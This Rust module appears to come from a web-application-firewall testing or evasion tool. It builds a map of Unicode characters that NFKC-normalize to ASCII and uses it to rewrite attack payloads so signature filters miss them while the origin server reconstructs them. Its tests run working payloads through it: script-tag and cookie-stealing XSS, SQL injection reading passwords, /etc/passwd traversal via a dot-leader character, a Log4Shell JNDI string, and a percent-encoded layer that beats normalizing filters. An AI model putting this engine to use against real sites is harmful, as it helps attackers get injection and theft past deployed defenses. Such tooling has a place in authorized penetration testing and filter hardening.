//! NFKC-preimage homoglyph engine — the principled, exhaustive generalization
//! of the four hand-rolled transforms in `super::unicode_norm`.
//!
//! ## The WAF↔origin normalization gap
//!
//! A regex/signature WAF matches ASCII attack tokens — `<script`, `union
//! select`, `alert(`, `/etc/passwd`. But a large class of origins normalize
//! input through **NFKC** (the W3C-recommended form: Node.js `String.prototype
//! .normalize`, Python `unicodedata.normalize`, Java `Normalizer`, .NET, many
//! template engines and identifier pipelines) *before* the value reaches the
//! sink. NFKC's *compatibility* decomposition collapses an enormous family of
//! stylistic Unicode codepoints back to plain ASCII:
//!
//! ```text
//!   ＜ﬃ𝚌𝓻𝕚𝖕𝓽＞   ──NFKC──▶   <script>      (WAF saw none of the literal bytes)
//! ```
//!
//! `super::unicode_norm` exploits this with **four** hand-picked styles
//! (fullwidth, math-bold, math-monospace, mixed). Unicode defines ~30 NFKC
//! styles per Latin letter (bold, italic, bold-italic, script, bold-script,
//! fraktur, bold-fraktur, double-struck, sans, sans-bold, sans-italic,
//! sans-bold-italic, monospace, fullwidth, circled, parenthesized,
//! superscript, subscript, …) plus digit styles, plus the Letterlike-Symbols
//! holes (italic `h` = U+210E PLANCK CONSTANT, script `e` = U+212F, …), plus
//! ligatures. Hand-listing them is the exact "hardcoded list" anti-pattern.
//!
//! This module instead **derives the complete inverse map directly from the
//! NFKC function**: enumerate Unicode once, fold each codepoint, and record
//! every codepoint that collapses to a single ASCII character. A future Unicode
//! revision extends coverage with zero code changes — the data IS the contract.
//!
//! Variant generation (style passes, minimal single-codepoint perturbation,
//! alternating) and the `NFKC(v) == payload` soundness gate live in the shared
//! `super::homoglyph_gen` — this module supplies only the inverse map and the
//! NFKC origin transform.

use std::collections::HashMap;
use std::sync::OnceLock;

use unicode_normalization::UnicodeNormalization;

/// Upper bound on codepoints scanned when building the preimage map. Covers
/// Latin-1 Supplement through the Mathematical Alphanumeric Symbols
/// (U+1D400–U+1D7FF) and Enclosed Alphanumeric Supplement / Symbols-for-Legacy
/// blocks — every NFKC-to-ASCII homoglyph Unicode 15 defines lives below this.
const SCAN_CEIL: u32 = 0x1_FBFF;

/// NFKC of a single character as a `String` (may be multi-char for ligatures).
fn nfkc_of_char(c: char) -> String {
    std::iter::once(c).nfkc().collect()
}

/// NFKC of a whole string.
fn nfkc(s: &str) -> String {
    s.nfkc().collect()
}

/// Inverse-NFKC map: ASCII graphic char → every codepoint that NFKC-folds to
/// exactly that one ASCII char. Built once, lazily, by enumerating Unicode and
/// inverting the real NFKC function. Deterministic (codepoint-ascending).
fn preimage_map() -> &'static HashMap<char, Vec<char>> {
    static MAP: OnceLock<HashMap<char, Vec<char>>> = OnceLock::new();
    MAP.get_or_init(|| {
        let mut m: HashMap<char, Vec<char>> = HashMap::new();
        for cp in 0xA0u32..=SCAN_CEIL {
            let Some(c) = char::from_u32(cp) else {
                continue;
            };
            if c.is_ascii() {
                continue;
            }
            let folded = nfkc_of_char(c);
            // Keep only 1:1 ASCII folds (a single ASCII byte) so substitution
            // is position-stable and round-trips exactly.
            if folded.len() == 1 {
                let a = folded.as_bytes()[0] as char;
                if a.is_ascii_graphic() {
                    m.entry(a).or_default().push(c);
                }
            }
        }
        m
    })
}

/// Multi-char inverse-NFKC: short ASCII token (len 2..=4) ← single codepoints
/// that NFKC-fold to *exactly* that token. One codepoint masquerades as a
/// multi-byte attack string — the path-traversal `..`→U+2025 (TWO DOT LEADER)
/// and `...`→U+2026 (HORIZONTAL ELLIPSIS) class, plus Roman numerals, `№`→`No`,
/// fractions, etc. A WAF matching the literal `../` never sees it; the origin
/// reconstructs it under NFKC.
fn multi_preimage_map() -> &'static HashMap<String, Vec<char>> {
    static MAP: OnceLock<HashMap<String, Vec<char>>> = OnceLock::new();
    MAP.get_or_init(|| {
        let mut m: HashMap<String, Vec<char>> = HashMap::new();
        for cp in 0xA0u32..=SCAN_CEIL {
            let Some(c) = char::from_u32(cp) else {
                continue;
            };
            if c.is_ascii() {
                continue;
            }
            let folded = nfkc_of_char(c);
            if (2..=4).contains(&folded.len()) && folded.is_ascii() {
                m.entry(folded).or_default().push(c);
            }
        }
        m
    })
}

/// Variants that replace a multi-char ASCII token with a single folding
/// codepoint (longest tokens first, so `...` wins over `..`). Soundness-gated.
fn multi_char_variants(payload: &str, max: usize) -> Vec<String> {
    if max == 0 {
        return Vec::new();
    }
    let mm = multi_preimage_map();
    let mut keys: Vec<&String> = mm.keys().filter(|k| payload.contains(k.as_str())).collect();
    keys.sort_by(|a, b| b.len().cmp(&a.len()).then(a.as_str().cmp(b.as_str())));
    let mut out: Vec<String> = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for key in keys {
        let Some(&cp) = mm.get(key).and_then(|v| v.first()) else {
            continue;
        };
        let candidate = payload.replace(key.as_str(), &cp.to_string());
        if candidate != payload && nfkc(&candidate) == payload && seen.insert(candidate.clone()) {
            out.push(candidate);
            if out.len() >= max {
                break;
            }
        }
    }
    out
}

/// Generate up to `max` NFKC-preimage variants of `payload`.
///
/// Every returned string is a *true NFKC-equivalent* of `payload` (an
/// NFKC-normalizing origin recovers the exact attack) but shares few or no
/// literal bytes with it, so an ASCII-token WAF rule does not match. Combines
/// single-char homoglyph substitution with single-codepoint multi-char token
/// folds; all gated by the `NFKC(v) == payload` soundness invariant.
#[must_use]
pub fn variants(payload: &str, max: usize) -> Vec<String> {
    let mut out = super::homoglyph_gen::generate(payload, max, preimage_map(), nfkc);
    if out.len() < max {
        let remaining = max - out.len();
        for v in multi_char_variants(payload, remaining) {
            if !out.contains(&v) {
                out.push(v);
            }
        }
    }
    out.truncate(max);
    out
}

/// How many distinct codepoints NFKC-fold to `c` (0 for non-foldable ASCII).
/// Exposed for diagnostics / tests; the engine itself uses `preimage_map`.
#[must_use]
pub fn preimage_count(c: char) -> usize {
    preimage_map().get(&c).map_or(0, Vec::len)
}

/// The canonical (codepoint-lowest) character whose NFKC normalization is
/// exactly `c`, or `None` when `c` has no non-ASCII NFKC preimage. This is the
/// per-character *structural inverse* of [`normalize`]:
/// `normalize(&first_preimage(c)?.to_string()) == c.to_string()`. Deterministic
/// (the map is built codepoint-ascending). The wafmodel solver uses it to
/// compute a single homoglyph preimage of an attack under an NFKC-normalizing
/// sink — the exact dual of percent-encoding under a URL-decoding sink — without
/// re-deriving the inverse-NFKC map (which lives only here, by NO-DUP contract).
#[must_use]
pub fn first_preimage(c: char) -> Option<char> {
    preimage_map().get(&c).and_then(|v| v.first()).copied()
}

/// NFKC-normalize `s` — the *origin-side* transform that reconstructs the exact
/// attack from any [`variants`] output (the dual of this engine). Exposed so
/// callers can model "what the NFKC-normalizing origin sees" without taking a
/// direct dependency on `unicode-normalization`.
#[must_use]
pub fn normalize(s: &str) -> String {
    nfkc(s)
}

/// Layered NFKC + percent-encoding variants — a normalization variant that is
/// *also* `%XX`-encoded. See `super::homoglyph_gen::generate_composed`. Only
/// an origin that url-decodes THEN NFKC-normalizes reconstructs the attack.
#[must_use]
pub fn composed_variants(payload: &str, max: usize) -> Vec<String> {
    super::homoglyph_gen::generate_composed(payload, max, preimage_map(), nfkc)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn preimage_map_is_rich_and_far_exceeds_the_four_hardcoded_styles() {
        for c in ['a', 's', 'c', 'r', 'i', 'p', 't', 'e', 'l', 'u', 'n', 'o'] {
            assert!(
                preimage_count(c) >= 8,
                "char {c:?} has only {} preimages; expected the full NFKC style set (>=8)",
                preimage_count(c)
            );
        }
        for c in ['<', '>', '(', ')', '/', ':', '\'', '"'] {
            assert!(
                preimage_count(c) >= 1,
                "punctuation {c:?} should have at least the fullwidth preimage"
            );
        }
    }

    #[test]
    fn every_variant_is_a_true_nfkc_equivalent_of_the_attack() {
        for attack in [
            "<script>alert(1)</script>",
            "union select password from users",
            "javascript:alert(document.cookie)",
            "../../../etc/passwd",
            "${jndi:ldap://x/a}",
        ] {
            let vs = variants(attack, 24);
            assert!(!vs.is_empty(), "no variants for {attack:?}");
            for v in &vs {
                assert_eq!(
                    normalize(v),
                    attack,
                    "UNSOUND variant {v:?} folds to {:?}, not the attack",
                    normalize(v)
                );
                assert_ne!(v, attack, "variant must differ from the literal attack");
            }
        }
    }

    #[test]
    fn defeats_a_literal_token_waf_while_origin_nfkc_recovers_the_attack() {
        let attack = "union select";
        let waf_tokens = ["union", "select"];
        let vs = variants(attack, 12);
        assert!(!vs.is_empty());
        for v in &vs {
            for tok in waf_tokens {
                assert!(
                    !v.contains(tok),
                    "literal WAF token {tok:?} survived in variant {v:?}"
                );
            }
            assert_eq!(normalize(v), attack, "origin NFKC must recover the attack");
        }
    }

    #[test]
    fn covers_styles_the_hardcoded_module_does_not() {
        let pre = preimage_map().get(&'a').cloned().unwrap_or_default();
        assert!(
            pre.contains(&'\u{1D44E}'),
            "preimage of 'a' must include MATHEMATICAL ITALIC SMALL A (U+1D44E)"
        );
        let pre_h = preimage_map().get(&'h').cloned().unwrap_or_default();
        assert!(
            pre_h.contains(&'\u{210E}'),
            "preimage of 'h' must include PLANCK CONSTANT (U+210E), the italic-h hole"
        );
    }

    #[test]
    fn emits_minimal_single_codepoint_perturbations() {
        let attack = "select";
        let vs = variants(attack, 32);
        let minimal = vs.iter().find(|v| {
            let non_ascii = v.chars().filter(|c| !c.is_ascii()).count();
            non_ascii == 1
        });
        let m = minimal.expect("expected a single-codepoint minimal-perturbation variant");
        assert_eq!(
            normalize(m),
            attack,
            "minimal variant must still fold to the attack"
        );
        assert!(!m.contains("select"));
        assert!(m.chars().filter(|c| c.is_ascii()).count() >= attack.len() - 1);
    }

    #[test]
    fn emits_an_alternating_partial_fold_variant() {
        // Guards the capability that subsumed `unicode_norm::mixed_fullwidth`:
        // homoglyph_gen Strategy B alternates substitution by position, so among
        // the variants there must be one that is *partially* folded — at least
        // two non-ASCII codepoints, yet with some foldable ASCII letter left
        // intact (distinct from the all-substituted style passes and from the
        // single-codepoint minimal perturbation). This is the "mixed" style a
        // position-anchored partial-match rule fails on.
        let attack = "alert(document)";
        let vs = variants(attack, 32);
        let alternating = vs.iter().find(|v| {
            let non_ascii = v.chars().filter(|c| !c.is_ascii()).count();
            let ascii_letters = v.chars().filter(char::is_ascii_alphabetic).count();
            non_ascii >= 2 && ascii_letters >= 1
        });
        let m = alternating.expect("engine must emit an alternating partial-fold (mixed) variant");
        assert_eq!(
            normalize(m),
            attack,
            "alternating variant must still fold to the attack"
        );
        assert_ne!(m.as_str(), attack);
    }

    #[test]
    fn single_codepoint_folds_a_multichar_path_traversal_token() {
        // ONE codepoint (U+2025 TWO DOT LEADER) masquerades as the two-byte
        // `..` traversal token; a WAF matching `../` misses it, the origin
        // NFKC-reconstructs the exact path.
        let attack = "../../../etc/passwd";
        let vs = variants(attack, 40);
        let v = vs
            .iter()
            .find(|v| v.contains('\u{2025}'))
            .expect("expected a U+2025 dot-leader path-traversal variant");
        assert_eq!(normalize(v), attack, "must fold back to the exact path");
        assert!(!v.contains(".."), "the literal `..` token must be gone");
    }

    #[test]
    fn composed_layer_defeats_normalizing_waf_and_url_decode_recovers_attack() {
        let attack = "<script>alert(1)</script>";
        let vs = composed_variants(attack, 12);
        assert!(!vs.is_empty());
        for v in &vs {
            // A WAF that NFKC-normalizes but does NOT url-decode sees inert %XX.
            assert!(
                v.contains('%'),
                "composed form must carry a percent layer: {v:?}"
            );
            assert_ne!(
                normalize(v),
                attack,
                "composed form must NOT fold to the attack without url-decoding: {v:?}"
            );
            // The origin (url-decode THEN NFKC) reconstructs the exact attack.
            let decoded = urlencoding::decode(v)
                .map(|c| c.into_owned())
                .unwrap_or_default();
            assert_eq!(
                normalize(&decoded),
                attack,
                "url-decode + NFKC must recover the exact attack"
            );
        }
    }

    #[test]
    fn multi_char_map_captures_dot_leaders() {
        let mm = multi_preimage_map();
        assert!(
            mm.get("..").is_some_and(|v| v.contains(&'\u{2025}')),
            ".. must have the TWO DOT LEADER (U+2025) preimage"
        );
        assert!(
            mm.get("...").is_some_and(|v| v.contains(&'\u{2026}')),
            "... must have the HORIZONTAL ELLIPSIS (U+2026) preimage"
        );
    }

    #[test]
    fn deterministic() {
        assert_eq!(variants("alert(1)", 16), variants("alert(1)", 16));
    }

    #[test]
    fn bounded_and_respects_max() {
        assert!(variants("union select from users", 5).len() <= 5);
        assert!(variants("union select from users", 0).is_empty());
    }

    #[test]
    fn no_foldable_chars_yields_nothing() {
        assert!(variants("\n\n", 8).is_empty());
    }

    #[test]
    fn map_build_is_cheap_enough_to_be_lazy_static() {
        let n = preimage_count('a');
        assert!(n > 0);
    }

    #[test]
    fn first_preimage_is_a_sound_single_char_inverse() {
        // The structural inverse the wafmodel solver composes: for every
        // foldable ASCII char, the canonical preimage NFKC-folds back to it,
        // and is never the char itself.
        for c in "<>/script'alert(1)=".chars() {
            if let Some(p) = first_preimage(c) {
                assert_ne!(p, c, "preimage of {c:?} is the char itself");
                assert!(!p.is_ascii(), "a homoglyph preimage must be non-ASCII");
                assert_eq!(
                    normalize(&p.to_string()),
                    c.to_string(),
                    "NFKC({p:?}) must equal {c:?}"
                );
            }
        }
        // The XSS-load-bearing angle brackets have a non-ASCII NFKC preimage
        // (the canonical/lowest is a compatibility form such as U+FE64 SMALL
        // LESS-THAN SIGN — we pin the soundness property, not the exact
        // codepoint, since the map is data-derived and Unicode-revision-stable).
        let lt = first_preimage('<').expect("'<' must have an NFKC preimage");
        assert_eq!(normalize(&lt.to_string()), "<");
        let gt = first_preimage('>').expect("'>' must have an NFKC preimage");
        assert_eq!(normalize(&gt.to_string()), ">");
        // Whitespace has no NFKC homoglyph.
        assert_eq!(first_preimage(' '), None);
        assert_eq!(first_preimage('\n'), None);
    }
}
